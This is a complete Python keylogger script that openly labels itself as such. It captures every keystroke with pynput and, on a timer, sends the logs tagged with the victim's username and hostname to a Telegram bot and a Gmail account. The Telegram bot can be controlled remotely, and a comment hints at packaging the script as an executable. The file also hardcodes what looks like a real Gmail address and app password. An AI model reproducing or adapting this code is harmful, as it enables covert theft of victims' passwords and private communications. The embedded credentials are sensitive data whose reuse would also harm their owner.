import os
import platform
import socket
import threading
import smtplib
import json
import sys
import time
from email.mime.text import MIMEText
import telebot # pip install pyTelegramBotAPI
from pynput import keyboard # pip install pynput

# ================= USER CONFIGURATION (HARDCODED) ===================
EMAIL_ADDRESS = "prakashwijesinghanew@gmail.com"
EMAIL_PASSWORD = "fner adgz ooqy jmps"
TO_EMAIL = "prakashwijesinghanew@gmail.com"
SEND_INTERVAL = 60
CONFIG_FILE = "config.json"
# ===================================================================

def get_config():
    """Load config or create a new one interactively."""
    config = {}
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                config = json.load(f)
        except Exception:
            print("❌ Error reading config file. Re-running setup.")
    
    # 1. Ask for Bot Token if missing
    if "bot_token" not in config or not config["bot_token"]:
        print("==========================================")
        print("      🚀 KEYLOGGER SETUP WIZARD 🚀        ")
        print("==========================================")
        token = input("👉 Enter Telegram Bot Token: ").strip()
        if not token:
            print("❌ Token is required! Exiting.")
            sys.exit(1)
        config["bot_token"] = token
        save_config(config)

    # 2. Auto-Discover Chat ID if missing
    if "chat_id" not in config or not config["chat_id"]:
        print("\nℹ️  Token saved. Now we need to connect to your Bot.")
        print(f"⚠️  Time to Auto-Detect your ID!")
        print(f"👉 Please open your bot in Telegram and send the command: /start")
        print("⏳ Waiting for you to message the bot...")
        
        try:
            temp_bot = telebot.TeleBot(config["bot_token"])
            
            # Helper to capture first message
            chat_id_data = {}
            
            # Using get_updates to manually poll once instead of infinity_polling for better control
            # But infinity_polling with a stop condition is also fine.
            # Let's use a simple loop with get_updates
            
            attempts = 0
            while attempts < 120: # Wait for 2 minutes max
                try:
                    updates = temp_bot.get_updates(offset=-1) # Get latest
                    if updates:
                        last_update = updates[-1]
                        chat_id = last_update.message.chat.id
                        print(f"\n✅ CAPTURED CHAT ID: {chat_id}")
                        chat_id_data['id'] = str(chat_id)
                        break
                except Exception as e:
                    pass
                time.sleep(1)
                sys.stdout.write(".")
                sys.stdout.flush()
                attempts += 1
            
            if 'id' in chat_id_data:
                config["chat_id"] = chat_id_data['id']
                save_config(config)
                print("\n✅ Configuration complete! Keylogger starting...")
            else:
                print("\n❌ Timed out waiting for message. Please try again.")
                sys.exit(1)
                
        except Exception as e:
            print(f"\n❌ Error during auto-discovery: {e}. Check your Token!")
            sys.exit(1)

    return config

def save_config(config):
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        print(f"❌ Error saving config: {e}")

class KeyloggerBot:
    def __init__(self, config):
        self.interval = SEND_INTERVAL
        self.token = config["bot_token"]
        self.chat_id = config["chat_id"]
        
        self.email = EMAIL_ADDRESS
        self.password = EMAIL_PASSWORD
        self.to_email = TO_EMAIL
        
        self.log = ""
        self.username = os.getlogin()
        self.hostname = socket.gethostname()
        
        self.is_logging = True
        self.email_enabled = True # Enabled by default per request
        
        try:
            self.bot = telebot.TeleBot(self.token)
            self.setup_bot_handlers()
        except Exception as e:
            print(f"❌ Error initializing Bot: {e}")
            sys.exit(1)

    def setup_bot_handlers(self):
        @self.bot.message_handler(commands=['start'])
        def handle_start(message):
            self.is_logging = True
            self.bot.reply_to(message, "✅ **Logging Started!**")

        @self.bot.message_handler(commands=['stop'])
        def handle_stop(message):
            self.is_logging = False
            self.bot.reply_to(message, "🛑 **Logging Stopped!** (Bot is active)")

        @self.bot.message_handler(commands=['email_on'])
        def handle_email_on(message):
            self.email_enabled = True
            self.bot.reply_to(message, "📧 **Email Logs: ENABLED**")

        @self.bot.message_handler(commands=['email_off'])
        def handle_email_off(message):
            self.email_enabled = False
            self.bot.reply_to(message, "📴 **Email Logs: DISABLED**")

        @self.bot.message_handler(commands=['logs'])
        def handle_logs(message):
            if self.log:
                self.send_data(force=True)
            else:
                self.bot.reply_to(message, "📭 Log is empty.")

        @self.bot.message_handler(commands=['help'])
        def handle_help(message):
            status_msg = (
                f"🤖 **Bot Status**\n"
                f"Logging: {'✅ ON' if self.is_logging else '🛑 OFF'}\n"
                f"Email: {'✅ ON' if self.email_enabled else '📴 OFF'}\n\n"
                f"**Commands:**\n"
                f"/start, /stop, /logs, /email_on, /email_off"
            )
            self.bot.reply_to(message, status_msg, parse_mode="Markdown")

    def append_to_log(self, string):
        self.log += string

    def on_press(self, key):
        if not self.is_logging:
            return

        try:
            current_key = str(key).replace("'", "")
        except ImportError:
            pass

        if key == keyboard.Key.space:
            current_key = " "
        elif key == keyboard.Key.enter:
            current_key = "\n"
        elif key == keyboard.Key.esc:
            pass
        elif key == keyboard.Key.backspace:
            current_key = " [BACKSPACE] " 
        elif str(key).find("Key") != -1:
            current_key = f" [{str(key).split('.')[1]}] "

        self.append_to_log(current_key)

    def send_email(self, message):
        if not self.email_enabled or not self.email or not self.password:
            return
            
        try:
            msg = MIMEText(message)
            msg['Subject'] = f"Keylogs - {self.username}@{self.hostname}"
            msg['From'] = self.email
            msg['To'] = self.to_email

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(self.email, self.password)
                server.send_message(msg)
        except Exception as e:
            print(f"Email Error: {e}")

    def send_data(self, force=False):
        if self.log:
            header = f"🔐 **Keylogs from:** `{self.username}@{self.hostname}`\n\n"
            full_message = header + self.log
            
            # Send to Telegram
            try:
                self.bot.send_message(self.chat_id, full_message, parse_mode="Markdown")
            except Exception as e:
                print(f"Telegram Error: {e}")

            # Send to Email (if enabled)
            if self.email_enabled:
                self.send_email(self.log)

            self.log = "" # Clear after sending

        # Restart timer if not forced
        if not force:
            timer = threading.Timer(self.interval, self.send_data)
            timer.daemon = True
            timer.start()

    def start(self):
        # Notify start
        try:
            self.bot.send_message(self.chat_id, f"🚀 **Keylogger Started!**\nTarget: `{self.username}@{self.hostname}`", parse_mode="Markdown")
            # print("✅ Bot connected to Telegram!") - Remove print to avoid noise in exe
        except Exception as e:
             pass

        # Start Reporting Timer
        self.send_data()

        # Start Key Listener (Non-blocking)
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        # Start Bot Polling (Blocking)
        try:
            self.bot.infinity_polling()
        except Exception:
            pass

if __name__ == "__main__":
    # 1. Load or Create Configuration (Auto-Discovery)
    config = get_config()
    
    # 2. Start Keylogger
    keylogger = KeyloggerBot(config)
    keylogger.start()
